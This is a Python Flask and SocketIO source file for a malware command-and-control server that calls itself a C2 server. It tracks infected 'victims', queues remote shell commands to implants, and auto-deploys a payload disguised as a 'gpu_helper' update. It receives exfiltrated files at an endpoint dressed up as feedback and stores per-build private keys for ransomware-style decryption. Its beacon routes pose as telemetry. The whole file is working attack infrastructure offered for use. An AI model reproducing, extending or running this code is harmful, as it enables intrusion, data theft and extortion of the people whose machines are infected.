import os
import json
import re
import sqlite3
import threading
import hashlib
import base64
import logging
from datetime import datetime

from flask import Flask, request, jsonify, send_from_directory, send_file
from flask_socketio import SocketIO, emit
from cryptography.fernet import Fernet

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
)
logger = logging.getLogger('c2_server')

DATA_DIR = os.path.join(os.path.dirname(__file__), "data")
DB_PATH = os.path.join(DATA_DIR, "c2_data.db")
KEY_PATH = os.path.join(DATA_DIR, "keys", "c2_key.json")
TRAFFIC_KEY_PATH = os.path.join(DATA_DIR, "keys", "traffic_key.key")

crypto = None

app = Flask(__name__, static_folder=None)
app.config['TEMPLATE_AUTO_RELOAD'] = True
socketio = SocketIO(app, cors_allowed_origins='*', async_mode='gevent')

pending_commands = {}
commands_lock = threading.Lock()
auto_deploy_targets = set()
AUTO_DEPLOY_PATH = os.path.join(DATA_DIR, "auto_deploy.json")
PAYLOAD_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "dist")
PLUGIN_DIR = os.path.join(os.path.dirname(__file__), "plugins")
API_KEY = os.environ.get('C2_API_KEY')

DANGEROUS_PATTERNS = ['rm -rf', 'format', 'del /f', 'rd /s', 'shutdown']


def require_auth():
    if API_KEY:
        key = request.headers.get('X-API-Key') or request.args.get('api_key')
        if key != API_KEY:
            return True
    return False


def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS victims (
            hostname TEXT PRIMARY KEY,
            data_encrypted BLOB NOT NULL,
            last_seen TEXT NOT NULL
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS command_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            hostname TEXT NOT NULL,
            command TEXT NOT NULL,
            params_encrypted BLOB,
            result TEXT,
            timestamp TEXT NOT NULL
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS alert_rules (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            field TEXT NOT NULL,
            operator TEXT NOT NULL,
            value TEXT NOT NULL,
            action_type TEXT NOT NULL,
            action_params TEXT,
            enabled INTEGER DEFAULT 1,
            created_at TEXT NOT NULL
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS alert_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            rule_id INTEGER,
            rule_name TEXT,
            hostname TEXT NOT NULL,
            matched_field TEXT,
            matched_value TEXT,
            action_taken TEXT,
            timestamp TEXT NOT NULL
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS build_keys (
            build_number INTEGER PRIMARY KEY AUTOINCREMENT,
            public_key TEXT NOT NULL,
            private_key TEXT NOT NULL,
            created_at TEXT NOT NULL
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS plugin_downloads (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            hostname TEXT NOT NULL,
            plugin_name TEXT NOT NULL,
            downloaded_at TEXT NOT NULL,
            UNIQUE(hostname, plugin_name)
        )
    """)
    conn.commit()
    conn.close()


def _derive_key(password: str, salt: bytes) -> bytes:
    return hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000, dklen=32)


def _derive_fernet(password: str, salt: bytes) -> Fernet:
    return Fernet(base64.urlsafe_b64encode(_derive_key(password, salt)))


VERIFY_PLAINTEXT = b'RogueByteOK'


def _needs_setup() -> bool:
    return not os.path.exists(KEY_PATH)


def _save_key_data(salt: bytes, verify_token: bytes):
    os.makedirs(os.path.dirname(KEY_PATH), exist_ok=True)
    with open(KEY_PATH, 'w') as f:
        json.dump({
            'salt': salt.hex(),
            'verify': verify_token.hex(),
        }, f)


def _load_key_data() -> tuple[bytes, bytes] | None:
    if not os.path.exists(KEY_PATH):
        return None
    with open(KEY_PATH) as f:
        data = json.load(f)
    return bytes.fromhex(data['salt']), bytes.fromhex(data['verify'])


def setup_crypto(password: str) -> bool:
    global crypto
    salt = os.urandom(16)
    f = _derive_fernet(password, salt)
    verify_token = f.encrypt(VERIFY_PLAINTEXT)
    _save_key_data(salt, verify_token)
    crypto = f
    logger.info("Crypto setup complete — DB key derived from password")
    return True


def unlock_crypto(password: str) -> bool:
    global crypto
    key_data = _load_key_data()
    if not key_data:
        return False
    salt, verify_token = key_data
    f = _derive_fernet(password, salt)
    try:
        plain = f.decrypt(verify_token)
        if plain != VERIFY_PLAINTEXT:
            return False
    except Exception:
        return False
    crypto = f
    logger.info("Crypto unlocked via password")
    return True


def load_traffic_key():
    if os.path.exists(TRAFFIC_KEY_PATH):
        with open(TRAFFIC_KEY_PATH, 'rb') as f:
            return Fernet(f.read())
    os.makedirs(os.path.dirname(TRAFFIC_KEY_PATH), exist_ok=True)
    key = Fernet.generate_key()
    with open(TRAFFIC_KEY_PATH, 'wb') as f:
        f.write(key)
    logger.info("Generated traffic encryption key: %s", TRAFFIC_KEY_PATH)
    return Fernet(key)


traffic_crypto = load_traffic_key()
init_db()


def _load_auto_deploy():
    if os.path.exists(AUTO_DEPLOY_PATH):
        try:
            with open(AUTO_DEPLOY_PATH) as f:
                data = json.load(f)
            if isinstance(data, list):
                auto_deploy_targets.update(data)
        except Exception:
            pass


def _save_auto_deploy():
    try:
        with open(AUTO_DEPLOY_PATH, 'w') as f:
            json.dump(list(auto_deploy_targets), f)
    except Exception:
        pass


os.makedirs(PLUGIN_DIR, exist_ok=True)
_load_auto_deploy()


def encrypt_data(data: dict) -> bytes:
    return crypto.encrypt(json.dumps(data).encode())


def decrypt_data(data: bytes) -> dict:
    return json.loads(crypto.decrypt(data))


def store_victim(hostname: str, data: dict, last_seen: str):
    encrypted = encrypt_data(data)
    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        "INSERT OR REPLACE INTO victims (hostname, data_encrypted, last_seen) "
        "VALUES (?, ?, ?)",
        (hostname, encrypted, last_seen)
    )
    conn.commit()
    conn.close()


def get_all_victims() -> dict:
    conn = sqlite3.connect(DB_PATH)
    rows = conn.execute(
        "SELECT hostname, data_encrypted, last_seen FROM victims"
    ).fetchall()
    conn.close()
    victims = {}
    for hostname, encrypted, last_seen in rows:
        try:
            data = decrypt_data(encrypted)
            victims[hostname] = {
                'last_seen': last_seen,
                'data': data.get('beacon_data', {}),
                'last_result': data.get('last_result'),
            }
        except Exception:
            continue
    return victims


def get_victim(hostname: str) -> dict:
    conn = sqlite3.connect(DB_PATH)
    row = conn.execute(
        "SELECT hostname, data_encrypted, last_seen FROM victims "
        "WHERE hostname = ?",
        (hostname,)
    ).fetchone()
    conn.close()
    if not row:
        return None
    _hostname, encrypted, last_seen = row
    try:
        data = decrypt_data(encrypted)
    except Exception:
        return None
    return {
        'last_seen': last_seen,
        'data': data.get('beacon_data', {}),
        'last_result': data.get('last_result'),
    }


def log_command(hostname: str, command: str, params: dict, result: str):
    params_encrypted = encrypt_data(params) if params else None
    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        "INSERT INTO command_log "
        "(hostname, command, params_encrypted, result, timestamp) "
        "VALUES (?, ?, ?, ?, ?)",
        (hostname, command, params_encrypted, result,
         datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    )
    conn.commit()
    conn.close()


def delete_victim(hostname: str):
    conn = sqlite3.connect(DB_PATH)
    conn.execute("DELETE FROM victims WHERE hostname = ?", (hostname,))
    conn.commit()
    conn.close()
    logger.info("Deleted victim from DB: %s", hostname)


def get_private_key(build_number: int) -> str | None:
    conn = sqlite3.connect(DB_PATH)
    row = conn.execute(
        "SELECT private_key FROM build_keys WHERE build_number = ?",
        (build_number,)
    ).fetchone()
    conn.close()
    return row[0] if row else None


def get_command_log(hostname: str = None, limit: int = 20) -> list:
    conn = sqlite3.connect(DB_PATH)
    if hostname:
        rows = conn.execute(
            "SELECT hostname, command, result, timestamp FROM command_log "
            "WHERE hostname = ? ORDER BY id DESC LIMIT ?",
            (hostname, limit)
        ).fetchall()
    else:
        rows = conn.execute(
            "SELECT hostname, command, result, timestamp FROM command_log "
            "ORDER BY id DESC LIMIT ?",
            (limit,)
        ).fetchall()
    conn.close()
    return [
        {'hostname': h, 'command': c, 'result': r, 'timestamp': t}
        for h, c, r, t in rows
    ]


def _load_alert_rules() -> list:
    conn = sqlite3.connect(DB_PATH)
    rows = conn.execute(
        "SELECT id, name, field, operator, value, action_type, action_params "
        "FROM alert_rules WHERE enabled = 1"
    ).fetchall()
    conn.close()
    return [
        {'id': r[0], 'name': r[1], 'field': r[2], 'operator': r[3],
         'value': r[4], 'action_type': r[5], 'action_params': r[6]}
        for r in rows
    ]


def _eval_rule(rule: dict, beacon_data: dict, result_text: str) -> bool:
    field = rule['field']
    if field == 'command_result':
        value = result_text or ''
    else:
        value = str(beacon_data.get(field, ''))
    target = rule['value']
    op = rule['operator']
    if op == 'equals':
        return value == target
    elif op == 'contains':
        return target in value
    elif op == 'starts_with':
        return value.startswith(target)
    elif op == 'matches':
        import re
        try:
            return bool(re.search(target, value))
        except Exception:
            return False
    elif op == 'gt':
        try:
            return float(value) > float(target)
        except Exception:
            return False
    elif op == 'lt':
        try:
            return float(value) < float(target)
        except Exception:
            return False
    return False


def _log_alert(rule_id: int, rule_name: str, hostname: str,
               field: str, value: str, action: str):
    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        "INSERT INTO alert_log (rule_id, rule_name, hostname, "
        "matched_field, matched_value, action_taken, timestamp) "
        "VALUES (?, ?, ?, ?, ?, ?, ?)",
        (rule_id, rule_name, hostname, field, value, action,
         datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    )
    conn.commit()
    conn.close()


def _get_alert_log(hostname: str = None, limit: int = 50) -> list:
    conn = sqlite3.connect(DB_PATH)
    if hostname:
        rows = conn.execute(
            "SELECT rule_name, hostname, matched_field, matched_value, "
            "action_taken, timestamp FROM alert_log "
            "WHERE hostname = ? ORDER BY id DESC LIMIT ?",
            (hostname, limit)
        ).fetchall()
    else:
        rows = conn.execute(
            "SELECT rule_name, hostname, matched_field, matched_value, "
            "action_taken, timestamp FROM alert_log "
            "ORDER BY id DESC LIMIT ?",
            (limit,)
        ).fetchall()
    conn.close()
    return [
        {'rule': r[0], 'hostname': r[1], 'field': r[2],
         'value': r[3], 'action': r[4], 'timestamp': r[5]}
        for r in rows
    ]


def evaluate_alert_rules(hostname: str, beacon_data: dict, result_text: str):
    rules = _load_alert_rules()
    for rule in rules:
        if not _eval_rule(rule, beacon_data, result_text):
            continue
        rname = rule['name']
        field = rule['field']
        actual = result_text if field == 'command_result' else str(beacon_data.get(field, ''))
        atype = rule['action_type']
        atype_label = {'notify_dashboard': 'notified dashboard', 'log': 'logged', 'auto_command': 'auto command'}.get(atype, atype)
        logger.info("Alert matched: %s on %s (%s %s %s)", rname, hostname, field, rule['operator'], rule['value'])
        alert_entry = {
            'rule': rname, 'hostname': hostname, 'field': field,
            'value': actual, 'action': atype_label,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        }
        if atype == 'notify_dashboard':
            socketio.emit('rule_alert', alert_entry)
            _log_alert(rule['id'], rname, hostname, field, actual, 'notified dashboard')
        elif atype == 'log':
            _log_alert(rule['id'], rname, hostname, field, actual, 'logged')
            socketio.emit('rule_alert', alert_entry)
        elif atype == 'auto_command':
            try:
                action_params = json.loads(rule['action_params']) if rule['action_params'] else {}
                cmd_name = action_params.get('command', '')
                cmd_params = action_params.get('params', {})
                if cmd_name == 'exec':
                    cmd_value = cmd_params.get('cmd', '')
                    if any(d in cmd_value.lower() for d in DANGEROUS_PATTERNS):
                        logger.warning("Alert auto_command blocked for %s: dangerous pattern", hostname)
                        _log_alert(rule['id'], rname, hostname, field, actual,
                                   f'auto_command blocked: dangerous pattern')
                        continue
                with commands_lock:
                    pending_commands[hostname] = {'command': cmd_name, 'params': cmd_params}
                _log_alert(rule['id'], rname, hostname, field, actual,
                           f'auto_command queued: {cmd_name}')
                logger.info("Alert auto_command queued %s for %s (rule: %s)", cmd_name, hostname, rname)
            except Exception as e:
                logger.warning("Alert auto_command failed for %s: %s", hostname, e)


def _parse_plugin_headers(path: str) -> dict:
    try:
        with open(path) as f:
            src = f.read()
        name = re.search(r'^PLUGIN_NAME\s*=\s*["\'](.+?)["\']', src, re.M)
        ver = re.search(r'^PLUGIN_VERSION\s*=\s*["\'](.+?)["\']', src, re.M)
        desc = re.search(r'^PLUGIN_DESCRIPTION\s*=\s*["\'](.+?)["\']', src, re.M)
        size = os.path.getsize(path)
        return {
            'name': name.group(1) if name else os.path.splitext(os.path.basename(path))[0],
            'version': ver.group(1) if ver else '0.0',
            'description': desc.group(1) if desc else '',
            'size': size,
        }
    except Exception:
        return None


def _list_plugins() -> list:
    results = []
    if not os.path.isdir(PLUGIN_DIR):
        return results
    for fname in sorted(os.listdir(PLUGIN_DIR)):
        if not fname.endswith('.py'):
            continue
        path = os.path.join(PLUGIN_DIR, fname)
        info = _parse_plugin_headers(path)
        if info:
            results.append(info)
    return results


def _log_plugin_download(hostname: str, plugin_name: str):
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        "INSERT OR REPLACE INTO plugin_downloads "
        "(hostname, plugin_name, downloaded_at) VALUES (?, ?, ?)",
        (hostname, plugin_name, now)
    )
    conn.commit()
    conn.close()


def _get_plugin_downloads() -> dict:
    conn = sqlite3.connect(DB_PATH)
    rows = conn.execute(
        "SELECT plugin_name, hostname FROM plugin_downloads "
        "ORDER BY plugin_name, hostname"
    ).fetchall()
    conn.close()
    result: dict[str, list[str]] = {}
    for pname, hname in rows:
        result.setdefault(pname, []).append(hname)
    return result


@app.before_request
def auth_check():
    if require_auth():
        return jsonify({'error': 'unauthorized'}), 401


@app.route('/api/telemetry', methods=['POST'])
def telemetry():
    try:
        encrypted_data = request.form.get('data', '')
        if not encrypted_data:
            body = request.json if request.json else {}
            encrypted_data = body.get('data', '') if isinstance(body, dict) else ''
        decrypted = traffic_crypto.decrypt(encrypted_data.encode())
        data = json.loads(decrypted)
    except Exception as e:
        logger.warning("Telemetry decrypt failed: %s", e)
        return jsonify({'success': False, 'message': 'invalid data'}), 400

    try:
        hostname = data.get('hostname')
        if hostname:
            last_seen = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

            if crypto is not None:
                existing = get_victim(hostname)
                result_text = data.get('result')
                last_result = existing.get('last_result') if existing else None
                if result_text:
                    last_result = {'result': result_text}
                stored = {
                    'beacon_data': data,
                    'last_result': last_result,
                }
                store_victim(hostname, stored, last_seen)
                vdata = get_victim(hostname)
                socketio.emit('victim_update', {'hostname': hostname, 'info': vdata})
                logger.info("Telemetry from %s: status=%s", hostname, data.get('status'))
                evaluate_alert_rules(hostname, data, result_text)

                if result_text:
                    log_command(hostname, 'result', {}, result_text)
                    logger.info("Result from %s: %s", hostname, result_text)
                    if result_text == 'self_destructed':
                        delete_victim(hostname)
                        socketio.emit('victim_removed', {'hostname': hostname})
                    entry = get_command_log(hostname, limit=1)
                    if entry:
                        socketio.emit('command_log_update', {'entry': entry[0]})
            else:
                logger.info("Telemetry from %s (locked — not stored)", hostname)

        if hostname and hostname in auto_deploy_targets:
            agent = (data.get('agent') or '').lower()
            vtype = (data.get('type') or '').lower()
            deployed = data.get('deployed', False)
            if agent in ('', 'hw_detect') and vtype in ('', 'scanner') and not deployed:
                with commands_lock:
                    pending_commands[hostname] = {'command': 'deploy', 'params': {}}
                logger.info("Auto-deploy queued for %s", hostname)

        cmd = None
        if hostname and hostname in pending_commands:
            with commands_lock:
                if hostname in pending_commands:
                    cmd = pending_commands[hostname]
                    del pending_commands[hostname]
            log_command(hostname, cmd['command'], cmd.get('params', {}), 'delivered')
            logger.info("  -> Sending command: %s", cmd['command'])

        response = {'success': True, 'message': 'ok', 'poll_ms': 60000}
        if cmd:
            response['config'] = {
                'flags': traffic_crypto.encrypt(
                    json.dumps(cmd).encode()
                ).decode()
            }
        return jsonify(response)
    except Exception as e:
        logger.error("Telemetry handler error: %s", e, exc_info=True)
        return jsonify({'success': False, 'message': 'internal error'}), 500


@app.route('/victims', methods=['GET'])
def list_victims():
    return jsonify(get_all_victims())


@app.route('/command_log', methods=['GET'])
def command_log():
    hostname = request.args.get('hostname')
    return jsonify(get_command_log(hostname))


def _inject_private_key(hostname: str, params: dict) -> dict:
    if params.get('private_key'):
        return params
    victim = get_victim(hostname)
    if victim:
        build_number = victim.get('data', {}).get('build_number')
        if build_number:
            pk = get_private_key(build_number)
            if pk:
                params['private_key'] = pk
                logger.info("Auto-injected private key for %s (build #%s)", hostname, build_number)
    return params


@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    hostname = data.get('hostname')
    if not hostname:
        return jsonify({'error': 'no hostname'}), 400

    command = data.get('command', '')
    if command == 'exec':
        cmd_value = data.get('params', {}).get('cmd', '')
        if any(d in cmd_value.lower() for d in DANGEROUS_PATTERNS):
            return jsonify({'error': 'command blocked'}), 403

    params = data.get('params', {})
    if command == 'decrypt':
        params = _inject_private_key(hostname, params)

    with commands_lock:
        pending_commands[hostname] = {
            'command': command,
            'params': params,
        }
    logger.info("Queued %s for %s", command, hostname)
    return jsonify({'status': 'ok'})


@app.route('/api/update/check', methods=['GET'])
def download_payload():
    plat = request.args.get('platform', 'linux')
    name = "gpu_helper.exe" if plat == "windows" else "gpu_helper"
    path = os.path.join(PAYLOAD_DIR, plat, name)
    if os.path.exists(path):
        with open(path, 'rb') as f:
            return f.read(), 200, {'Content-Type': 'application/octet-stream'}
    return jsonify({'error': f'payload not found: {path}'}), 404


@socketio.on('connect')
def handle_connect():
    if crypto is None:
        emit('server_state', {
            'locked': True,
            'needs_setup': _needs_setup(),
        })
        return
    victims = get_all_victims()
    logs = get_command_log(limit=50)
    emit('dashboard_state', {
        'victims': victims,
        'logs': logs,
        'auto_deploy_targets': list(auto_deploy_targets),
    })


@socketio.on('toggle_auto_deploy')
def handle_toggle_auto_deploy(data):
    if crypto is None:
        return
    hostname = data.get('hostname')
    enabled = data.get('enabled', False)
    if not hostname:
        emit('auto_deploy_toggled', {'error': 'no hostname'})
        return
    if enabled:
        auto_deploy_targets.add(hostname)
    else:
        auto_deploy_targets.discard(hostname)
    _save_auto_deploy()
    logger.info("Auto-deploy %s for %s", 'enabled' if enabled else 'disabled', hostname)
    emit('auto_deploy_toggled', {'hostname': hostname, 'enabled': enabled})


@socketio.on('send_command')
def handle_send_command(data):
    if crypto is None:
        return
    hostname = data.get('hostname')
    command = data.get('command', '')
    params = data.get('params', {})

    if not hostname:
        emit('command_sent', {'error': 'no hostname'})
        return

    if command == 'exec':
        cmd_value = params.get('cmd', '')
        if any(d in cmd_value.lower() for d in DANGEROUS_PATTERNS):
            emit('command_sent', {'error': 'command blocked'})
            return

    if command == 'decrypt':
        params = _inject_private_key(hostname, params)

    with commands_lock:
        pending_commands[hostname] = {'command': command, 'params': params}
    logger.info("Socket queued %s for %s", command, hostname)
    emit('command_sent', {'status': 'ok', 'hostname': hostname, 'command': command})


@app.route('/api/feedback/upload', methods=['POST'])
def receive_exfil():
    hostname = request.form.get('hostname', 'unknown')
    file_path = request.form.get('path', 'unknown')
    file_data = request.files.get('file')
    if file_data is None:
        return jsonify({'error': 'no file'}), 400
    exfil_dir = os.path.join(DATA_DIR, "exfil", hostname)
    os.makedirs(exfil_dir, exist_ok=True)
    safe_name = os.path.basename(file_path)
    save_path = os.path.join(exfil_dir, safe_name)
    file_data.save(save_path)
    size = os.path.getsize(save_path)
    logger.info("Exfil from %s: %s (%d bytes)", hostname, safe_name, size)
    return jsonify({'status': 'ok', 'path': safe_name, 'size': size})


GIF_DIR = os.path.join(DATA_DIR, "gifs")


@app.route('/api/scare/gifs', methods=['GET'])
def scare_gifs():
    if request.args.get('list') == '1':
        try:
            files = [f for f in os.listdir(GIF_DIR) if f.endswith('.gif')]
            return jsonify(files)
        except FileNotFoundError:
            return jsonify([])
    filename = request.args.get('file', '')
    if not filename or '..' in filename or '/' in filename:
        return jsonify({'error': 'invalid filename'}), 400
    path = os.path.join(GIF_DIR, filename)
    if not os.path.exists(path):
        return jsonify({'error': 'not found'}), 404
    return send_file(path, mimetype='image/gif')


@app.route('/api/extensions', methods=['GET'])
def list_plugins():
    if crypto is None:
        return jsonify({'error': 'server locked'}), 401
    return jsonify(_list_plugins())


@app.route('/api/extensions/<name>/source', methods=['GET'])
def download_plugin(name):
    if crypto is None:
        return jsonify({'error': 'server locked'}), 401
    safe = os.path.basename(name)
    if '..' in safe or '/' in safe or '\\' in safe:
        return jsonify({'error': 'invalid name'}), 400
    if not safe.endswith('.py'):
        safe = safe + '.py'
    path = os.path.join(PLUGIN_DIR, safe)
    if not os.path.exists(path):
        return jsonify({'error': 'not found'}), 404
    hostname = request.args.get('hostname', '')
    if hostname:
        _log_plugin_download(hostname, safe.replace('.py', ''))
    with open(path) as f:
        return f.read(), 200, {'Content-Type': 'text/x-python'}


@app.route('/api/extensions/register', methods=['POST'])
def upload_plugin():
    if crypto is None:
        return jsonify({'error': 'server locked'}), 401
    file = request.files.get('file')
    if not file or not file.filename.endswith('.py'):
        return jsonify({'error': 'invalid file'}), 400
    safe_name = os.path.basename(file.filename)
    dest = os.path.join(PLUGIN_DIR, safe_name)
    file.save(dest)
    info = _parse_plugin_headers(dest)
    if not info or not info.get('name'):
        os.unlink(dest)
        return jsonify({'error': 'plugin missing PLUGIN_NAME header'}), 400
    logger.info("Plugin uploaded: %s v%s", info['name'], info['version'])
    return jsonify(info)


@app.route('/api/extensions/unregister', methods=['POST'])
def delete_plugin():
    if crypto is None:
        return jsonify({'error': 'server locked'}), 401
    name = (request.json or {}).get('name', '')
    if not name:
        return jsonify({'error': 'no name'}), 400
    for fname in os.listdir(PLUGIN_DIR):
        if fname.endswith('.py'):
            info = _parse_plugin_headers(os.path.join(PLUGIN_DIR, fname))
            if info and info['name'] == name:
                os.unlink(os.path.join(PLUGIN_DIR, fname))
                logger.info("Plugin deleted: %s", name)
                return jsonify({'status': 'deleted'})
    return jsonify({'error': 'not found'}), 404


@app.route('/api/extensions/status', methods=['GET'])
def plugin_status():
    if crypto is None:
        return jsonify({'error': 'server locked'}), 401
    return jsonify(_get_plugin_downloads())


SHUTDOWN_KEY = os.environ.get('C2_SHUTDOWN_KEY', 'shutdown')


PUBLIC_ROUTES = ['/api/login', '/api/setup', '/assets/', '/api/shutdown', '/api/telemetry']


@app.before_request
def lock_check():
    if crypto is not None:
        return
    path = request.path
    if path == '/':
        return
    for prefix in PUBLIC_ROUTES:
        if path.startswith(prefix):
            return
    return jsonify({'error': 'server locked'}), 401


@app.route('/api/login', methods=['POST'])
def login():
    data = request.json or {}
    password = data.get('password', '')
    if not password:
        return jsonify({'error': 'password required'}), 400
    if unlock_crypto(password):
        victims = get_all_victims()
        logs = get_command_log(limit=50)
        socketio.emit('server_unlocked', {'success': True})
        socketio.emit('dashboard_state', {
            'victims': victims,
            'logs': logs,
            'auto_deploy_targets': list(auto_deploy_targets),
        })
        return jsonify({'status': 'ok', 'message': 'unlocked'})
    return jsonify({'error': 'invalid password'}), 403


@app.route('/api/setup', methods=['POST'])
def setup():
    if not _needs_setup():
        return jsonify({'error': 'already configured'}), 400
    data = request.json or {}
    password = data.get('password', '')
    if not password or len(password) < 4:
        return jsonify({'error': 'password must be at least 4 characters'}), 400
    setup_crypto(password)
    victims = get_all_victims()
    logs = get_command_log(limit=50)
    socketio.emit('server_unlocked', {'success': True, 'first_time': True})
    socketio.emit('dashboard_state', {
        'victims': victims,
        'logs': logs,
        'auto_deploy_targets': list(auto_deploy_targets),
    })
    return jsonify({'status': 'ok', 'message': 'crypto configured'})


@app.route('/api/shutdown', methods=['POST'])
def shutdown_server():
    data = request.json or {}
    key = data.get('key', '')
    if key != SHUTDOWN_KEY:
        return jsonify({'error': 'invalid key'}), 403
    logger.warning("Server shutdown requested — stopping")
    socketio.emit('server_shutting_down', {'message': 'server is shutting down'})
    threading.Thread(target=lambda: os._exit(0), daemon=True).start()
    return jsonify({'status': 'shutting down'})


@socketio.on('unlock_server')
def handle_unlock(data):
    password = data.get('password', '')
    if not password:
        emit('unlock_result', {'success': False, 'error': 'password required'})
        return
    if _needs_setup():
        success = setup_crypto(password)
        emit('unlock_result', {'success': success, 'first_time': True})
    else:
        success = unlock_crypto(password)
        emit('unlock_result', {'success': success})
    if success:
        logger.info("Server unlocked via socket")
        victims = get_all_victims()
        logs = get_command_log(limit=50)
        emit('dashboard_state', {
            'victims': victims,
            'logs': logs,
            'auto_deploy_targets': list(auto_deploy_targets),
        })


@socketio.on('shutdown_server')
def handle_shutdown(data):
    key = data.get('key', '')
    if key != SHUTDOWN_KEY:
        emit('server_shutting_down', {'error': 'invalid key'})
        return
    logger.warning("Socket shutdown requested — stopping")
    emit('server_shutting_down', {'message': 'server is shutting down'})
    threading.Thread(target=lambda: os._exit(0), daemon=True).start()


@app.route('/api/triggers', methods=['GET'])
def list_alert_rules():
    if crypto is None:
        return jsonify({'error': 'server locked'}), 401
    conn = sqlite3.connect(DB_PATH)
    rows = conn.execute(
        "SELECT id, name, field, operator, value, action_type, "
        "action_params, enabled, created_at FROM alert_rules ORDER BY id"
    ).fetchall()
    conn.close()
    return jsonify([
        {'id': r[0], 'name': r[1], 'field': r[2], 'operator': r[3],
         'value': r[4], 'action_type': r[5], 'action_params': r[6],
         'enabled': bool(r[7]), 'created_at': r[8]}
        for r in rows
    ])


@app.route('/api/triggers', methods=['POST'])
def create_alert_rule():
    if crypto is None:
        return jsonify({'error': 'server locked'}), 401
    data = request.json or {}
    required = ['name', 'field', 'operator', 'value', 'action_type']
    for k in required:
        if k not in data:
            return jsonify({'error': f'missing {k}'}), 400
    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        "INSERT INTO alert_rules (name, field, operator, value, "
        "action_type, action_params, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
        (data['name'], data['field'], data['operator'], data['value'],
         data['action_type'], json.dumps(data.get('action_params', {})),
         datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    )
    conn.commit()
    rid = conn.execute("SELECT last_insert_rowid()").fetchone()[0]
    conn.close()
    logger.info("Alert rule created: %s (id=%d)", data['name'], rid)
    return jsonify({'id': rid, 'status': 'created'})


@app.route('/api/triggers/<int:rule_id>', methods=['PUT'])
def update_alert_rule(rule_id):
    if crypto is None:
        return jsonify({'error': 'server locked'}), 401
    data = request.json or {}
    conn = sqlite3.connect(DB_PATH)
    existing = conn.execute(
        "SELECT id FROM alert_rules WHERE id = ?", (rule_id,)
    ).fetchone()
    if not existing:
        conn.close()
        return jsonify({'error': 'not found'}), 404
    updates = []
    params = []
    for k in ['name', 'field', 'operator', 'value', 'action_type']:
        if k in data:
            updates.append(f"{k} = ?")
            params.append(data[k])
    if 'action_params' in data:
        updates.append("action_params = ?")
        params.append(json.dumps(data['action_params']))
    if 'enabled' in data:
        updates.append("enabled = ?")
        params.append(1 if data['enabled'] else 0)
    if updates:
        params.append(rule_id)
        conn.execute(
            f"UPDATE alert_rules SET {', '.join(updates)} WHERE id = ?",
            params
        )
        conn.commit()
    conn.close()
    return jsonify({'status': 'updated'})


@app.route('/api/triggers/<int:rule_id>', methods=['DELETE'])
def delete_alert_rule(rule_id):
    if crypto is None:
        return jsonify({'error': 'server locked'}), 401
    conn = sqlite3.connect(DB_PATH)
    conn.execute("DELETE FROM alert_rules WHERE id = ?", (rule_id,))
    conn.commit()
    conn.close()
    return jsonify({'status': 'deleted'})


@app.route('/api/triggers/<int:rule_id>/state', methods=['POST'])
def toggle_alert_rule(rule_id):
    if crypto is None:
        return jsonify({'error': 'server locked'}), 401
    conn = sqlite3.connect(DB_PATH)
    row = conn.execute(
        "SELECT enabled FROM alert_rules WHERE id = ?", (rule_id,)
    ).fetchone()
    if not row:
        conn.close()
        return jsonify({'error': 'not found'}), 404
    new_val = 1 if row[0] == 0 else 0
    conn.execute("UPDATE alert_rules SET enabled = ? WHERE id = ?", (new_val, rule_id))
    conn.commit()
    conn.close()
    return jsonify({'enabled': bool(new_val)})


@app.route('/api/triggers/log', methods=['GET'])
def alert_log():
    if crypto is None:
        return jsonify({'error': 'server locked'}), 401
    hostname = request.args.get('hostname')
    return jsonify(_get_alert_log(hostname))


SPA_DIR = os.path.join(os.path.dirname(__file__), 'static')


@app.route('/assets/<path:filename>')
def spa_assets(filename):
    return send_from_directory(os.path.join(SPA_DIR, 'assets'), filename)


@app.route('/')
@app.route('/<path:path>')
def serve_spa(path=''):
    if path:
        filepath = os.path.join(SPA_DIR, path)
        if os.path.exists(filepath) and os.path.isfile(filepath):
            return send_from_directory(SPA_DIR, path)
    return send_from_directory(SPA_DIR, 'index.html')


if __name__ == '__main__':
    debug_mode = os.environ.get('FLASK_DEBUG', '').lower() in ('1', 'true', 'yes')
    needs = _needs_setup()
    logger.info("C2 Server starting on http://0.0.0.0:4444 (debug=%s, locked=%s, needs_setup=%s)",
                 debug_mode, crypto is None, needs)
    socketio.run(app, host='0.0.0.0', port=4444, debug=debug_mode)
